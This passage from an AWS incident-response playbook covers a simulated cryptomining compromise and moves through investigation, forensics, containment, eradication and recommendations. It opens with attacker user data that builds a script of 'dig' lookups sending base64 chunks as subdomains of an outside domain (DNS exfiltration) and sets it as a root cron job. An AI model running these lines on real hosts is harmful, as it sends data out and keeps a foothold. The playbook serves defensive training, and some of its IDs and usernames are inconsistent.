echo "  dig BzdW0sIHF1aXMgZnJpbmdpbGxhIHNlbS4gTW9y.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YmkgbWFsZXN1YWRhIHNhcGllbiBzZWQgbWV0dX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgY29udmFsbGlzLCBzaXQgYW1ldCBldWlzbW9k.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGF1Z3VlIHBlbGxlbnRlc3F1ZS4gTW9yYmkgbm.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig liaCBlcmF0LCBwb3N1ZXJlIHNpdCBhbWV0IGFj.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Y3Vtc2FuIG5lYywgbWFsZXN1YWRhIGEgbGVvLg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig oKRG9uZWMgZXUgcHJldGl1bSBvZGlvLiBBZW5l.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig YW4gdHJpc3RpcXVlIHF1YW0gdmVsIG9yY2kgYW.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig xpcXVhbSwgbmVjIHNjZWxlcmlzcXVlIG51bmMg.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig c3VzY2lwaXQuIEV0aWFtIGVsaXQgc2VtLCB2aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig ZlcnJhIG5lYyBmcmluZ2lsbGEgdml0YWUsIGV1.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXNtb2QgaWQgdHVycGlzLiBJbnRlZ2VyIHF1aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgZXJhdCBlZ2V0IGFyY3UgdGluY2lkdW50IHBl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig bGxlbnRlc3F1ZS4gQ3VyYWJpdHVyIHF1YW0gbn.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig VsbGEsIGx1Y3R1cyB2ZWwgdm9sdXRwYXQgZWdl.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig dCwgZGFwaWJ1cyBldCBudW5jLiBOdW5jIHF1aX.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig MgbGliZXJvIGFsaXF1YW0sIGNvbmRpbWVudHVt.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IGp1c3RvIHF1aXMsIGxhY2luaWEgbmVxdWUuIF.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig Byb2luIGRhcGlidXMgZWxpdCBhdCBoZW5kcmVy.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig aXQgbWF4aW11cy4gU2VkIHNlbXBlciBudW5jIG.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig 1hc3NhLCBlZ2V0IHBlbGxlbnRlc3F1ZSBlbGl0.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "  dig IHNhZ2l0dGlzIHNlZC4g.afsdem.com;" >> /usr/cryptokit/persist.sh
echo "done" >> /usr/cryptokit/persist.sh
one_call=$(/usr/cryptokit/persist.sh)
touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root
echo "*/15 * * * * /usr/cryptokit/persist.sh" >> /var/spool/cron/root
--//


```

#### Analysis of Athena query and AWS CLI results:

* The actor used an IAM User with ARN ```arn:aws:iam::999999999999:user/pipeline```
* The actor used IAM Access Key ```AKIAIOSFODNN7EXAMPLE``` with the AWS CLI
* The actor used source IP address ```203.0.113.99``` for the API calls
* The source IP address used by the actor ```203.0.113.99``` has also been used by other principals  
* The actor performed changes to the services with the API call RunInstances. No other calls have been made.
* The actor provisioned 10 EC2 instances of which 4 generated GuardDuty findings:
    * i-021345abcdef678a
    * i-021345abcdef678b
    * i-021345abcdef678c
    * i-021345abcdef678d
    * i-021345abcdef678e
    * i-021345abcdef678f
    * i-021345abcdef678g
    * i-021345abcdef678h
    * i-021345abcdef678i
    * i-021345abcdef678j
* The public IP addresses the EC2 instances contacted have not made any API calls   
* Base AMI used by the actor was ```Amazon Linux 2 AMI 2.0.20210721.2 x86_64 HVM gp2```
* EC2 Instance type was ```t2.nano```
* Security Groups do not allow inbound traffic from the internet
* EC2 instance profile absent
* EC2 User Data contains customer crypto mining instrumentation


* Source IP address reputation (example for one IP address):
   * ExoneraTor: The ExoneraTor service maintains a database of IP addresses that have been part of the Tor network. 
      * https://metrics.torproject.org/exonerator.html?ip=203.0.113.99×tamp=2021-07-24&lang=en
   * Greynoise:
      * IP reputation service
         * https://www.greynoise.io/viz/query/?gnql=203.0.113.99
   * Whois:
      * There are several options to acquire WHOIS information, here is one directly from CLI for one of the IP addresses
         * ```whois 203.0.113.99```
       
#### EC2 Forensics preparation (if deemed necessary)

* Steps provided using the AWS Console. We recommend translating these steps into AWS CLI commands or automation.
* It is out of scope of this playbook to describe Operating System forensics techniques.

**Capturing snapshot for offline analysis using the AWS Console** 
1. Open the Amazon EC2 console at https://console.aws.amazon.com/ec2/.
2. Choose **Snapshots** under Elastic Block Store in the navigation pane.
3. Choose **Create Snapshot**.
4. For Select resource type, choose **Volume**.
5. For Volume, select the volume of the instance under investigation.
6. Choose **Create Snapshot**.

**Create a volume from a snapshot**
1. Open the Amazon EC2 console at https://console.aws.amazon.com/ec2/.
2. From the navigation bar, select the Region where your snapshot is located.
3. In the navigation pane, choose ELASTIC BLOCK STORE, **Volumes**.
4. Choose **Create Volume**.
5. F**or Volume Type, keep defaults**
6. For Snapshot ID, start typing the ID or description of the snapshot from which you are restoring the volume, and choose it from the list of suggested options.
7. **For Size, keep the defaults.**
8. **For the IOPS and Throughput - keep the defaults.**
9. For **Availability Zone**, choose the Availability Zone in which to create the volume. An EBS volume must be attached to an EC2 instance that is in the same Availability Zone as the volume.
10. Choose **Create Volume**.

**Attach Volume to Forensic EC2 Instance**
1. Open the Amazon EC2 console at https://console.aws.amazon.com/ec2/.
2. In the navigation pane, choose Elastic Block Store, **Volumes**.
3. Select the volume created in Step 2 and choose Actions, **Attach Volume**.
4. For Instance, start typing the name or ID of the instance. Select the instance from the list of options (only instances that are in the same Availability Zone as the volume are displayed).
5. **For Device, keep the suggested device name**
6. Choose **Attach**.
    
**Make volume accessible in the Forensics EC2 Instance**
1. Within the Forensics EC2 Instance, run `sudo mkdir /data`
2. Within the Forensics EC2 Instance, run `sudo mount -r /dev/xvdf1 /data`

**Note** If this fails, ensure that you see `xvdf` when you run `lsblk`. The storage should be visible, however if any defaults were changed - it may be a different volume.

 
* * *

### Part 3: Analysis - Impact

Parse through the distilled information looking for patterns, extrapolate into behaviors that contrast with expected baseline of approved activity. Take a holistic approach looking at the data presented to you and continuously ask yourself if the constructed patterns represent normal behavior, external actor, or insider. The following questions will serve as a guide, but don’t limit yourself, expand based on your own findings and doubts. Make sure to have *data* backing up your answers:

1. What related alerts have been triggered?
2. What is the classification of the data accessed?
3. What AWS services are not in the approved use list?
4. What AWS service configurations have been changed?
5. What guardrails have been disabled or modified?
6. Was the actor an insider or outsider?
7. What evidence supports benign and malicious activity?
8. What is the impact to business applications and processes?
9. Is there any indication of possible exfiltration of data?

* * *


### Part 4: Containment

#### Resource list for account ```777777777777```:
* The actor used an IAM User with ARN ```arn:aws:iam::999999999999:user/pipeline```
* The actor used IAM Access Key ```AKIAIOSFODNN7EXAMPLE``` with the AWS CLI
* The actor used source IP address ```203.0.113.99``` for the API calls
* The source IP address used by the actor ```203.0.113.99``` has also been used by other principals  
* EC2 Instances
    * i-021345abcdef678a
    * i-021345abcdef678b
    * i-021345abcdef678c
    * i-021345abcdef678d
    * i-021345abcdef678e
    * i-021345abcdef678f
    * i-021345abcdef678g
    * i-021345abcdef678h
    * i-021345abcdef678i
    * i-021345abcdef678j

#### Containment actions:

* Disable IAM Access Key IDs ```AKIAIOSFODNN7EXAMPLE``` and verify:

```
aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive --user-name pipeline
(no output)

aws iam list-access-keys --user-name pipeline
{
    "AccessKeyMetadata": [
        {
            "UserName": "integration",
            "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
            "Status": "Active",
            "CreateDate": "2021-07-24T02:31:19+00:00"
        }
    ]
}


aws iam update-access-key --access-key-id AKIAIOSFODNN7EXAMPLE --status Inactive  --user-name pipeline
(no output)

aws iam list-access-keys --user-name pipeline
{
    "AccessKeyMetadata": [
        {
            "UserName": "pipeline",
            "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
            "Status": "Inactive",
            "CreateDate": "2021-07-24T02:22:34+00:00"
        }
    ]
}

```

* Attach the following policy to IAM Users ```pipeline``` and verify:

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "IamPolicyForContainment",
      "Action": "*",
      "Effect": "Deny",
      "Resource": "*"
    }
  ]
}
```

```
aws iam create-policy --policy-name iam-containment-policy --policy-document file://containment/iam_containment_policy.json
{
    "Policy": {
        "PolicyName": "iam-containment-policy",
        "PolicyId": "ANPAJ2UCCR6DPCEXAMPLE",
        "Arn": "arn:aws:iam::777777777777:policy/iam-containment-policy",
        "Path": "/",
        "DefaultVersionId": "v1",
        "AttachmentCount": 0,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2021-07-26T00:37:18+00:00",
        "UpdateDate": "2021-07-26T00:37:18+00:00"
    }
}
aws iam attach-user-policy --policy-arn arn:aws:iam::777777777777:policy/iam-containment-policy --user-name pipeline
(no output)

aws iam list-attached-user-policies --user-name pipeline
{
    "AttachedPolicies": [
        {
            "PolicyName": "iam-containment-policy",
            "PolicyArn": "arn:aws:iam::777777777777:policy/iam-containment-policy"
        },
        {
            "PolicyName": "SimulationStack-SystemIntegrationPolicy",
            "PolicyArn": "arn:aws:iam::777777777777:policy/SimulationStack-SystemIntegrationPolicy"
        }
    ]
}

```

* Containment for IP address ```203.0.113.99``` is not possible as it is used by other IAM principals for API calls.


```
# Stop EC2 instances
instances="i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j"
for instance in ${instances}; do aws ec2 stop-instances --instance-ids ${instance} --region us-east-1 --profile security_break_glass; done 
```

* For each EC2 instance, you will receive a response like this:

```
{
    "StoppingInstances": [
        {
            "CurrentState": {
                "Code": 64,
                "Name": "stopping"
            },
            "InstanceId": "i-021345abcdef678b",
            "PreviousState": {
                "Code": 16,
                "Name": "running"
            }
        }
    ]
}
```

```
# Check EC2 instances state
instances="i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j"
for instance in ${instances}; do aws ec2 describe-instances --instance-ids ${instance} --region us-east-1 --profile security_break_glass | jq -r '.Reservations[].Instances[].State.Name'; done 
```

* Once they are all stopped, this will be the output

```
stopped
stopped
stopped
stopped
stopped
stopped
stopped
stopped
stopped
stopped

```

* * *

### Part 5: Eradication

#### Resource list for account ```777777777777```:
* The actor used an IAM User with ARN ```arn:aws:iam::999999999999:user/pipeline```
* The actor used IAM Access Key ```AKIAIOSFODNN7EXAMPLE``` with the AWS CLI
* EC2 Instances
    * i-021345abcdef678a
    * i-021345abcdef678b
    * i-021345abcdef678c
    * i-021345abcdef678d
    * i-021345abcdef678e
    * i-021345abcdef678f
    * i-021345abcdef678g
    * i-021345abcdef678h
    * i-021345abcdef678i
    * i-021345abcdef678j

***>>>>>THESE ACTIONS ARE FINAL AND UNRECOVERABLE<<<<<***

* Delete IAM Users
```
aws iam detach-user-policy --user-name pipeline --policy-arn arn:aws:iam::777777777777:policy/SimulationStack-SystemIntegrationPolicy
(no output)
aws iam detach-user-policy --user-name pipeline --policy-arn arn:aws:iam::777777777777:policy/iam-containment-policy
(no output)
aws iam delete-access-key --user-name pipeline --access-key-id AKIAIOSFODNN7EXAMPLE
(no output)
aws iam delete-user --user-name pipeline
(no output)
aws iam get-user --user-name pipeline

An error occurred (NoSuchEntity) when calling the GetUser operation: The user with name integration cannot be found.

```

* Terminate EC2 instances

```
# Terminate EC2 instances
instances="i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j"
for instance in ${instances}; do aws ec2 terminate-instances --instance-ids ${instance} --region us-east-1 --profile security_break_glass; done 
```

* For each EC2 instance, you will receive a response like this:

```
{
    "TerminatingInstances": [
        {
            "CurrentState": {
                "Code": 48,
                "Name": "terminated"
            },
            "InstanceId": "i-021345abcdef678a",
            "PreviousState": {
                "Code": 80,
                "Name": "stopped"
            }
        }
    ]
}
```

```
# Check EC2 instances state
instances="i-021345abcdef678a i-021345abcdef678b i-021345abcdef678c i-021345abcdef678d i-021345abcdef678e i-021345abcdef678f i-021345abcdef678g i-021345abcdef678h i-021345abcdef678i i-021345abcdef678j"
for instance in ${instances}; do aws ec2 describe-instances --instance-ids ${instance} --region us-east-1 --profile security_break_glass | jq -r '.Reservations[].Instances[].State.Name'; done 
```

* Once all are terminated, you will receive this response

```
terminated
terminated
terminated
terminated
terminated
terminated
terminated
terminated
terminated
terminated

```

* * *

### Part 6: Recovery 

* No recovery steps required

* * *

### Part 7: Post-Incident Activity

**Recommendations:**
* Automate containment and eradication with AWS CLI or SDK
* Save all Athena queries used in the playbook for faster use
* Pursue eliminating use of long term IAM User Access Keys and adopt short term STS tokens
* Design "clean room" for EC2 forensics in AWS including forensics tooling AMIs
* Create alerts based on usage spike of EC2 instances
* Create alerts based on creation of long term IAM User Access Keys

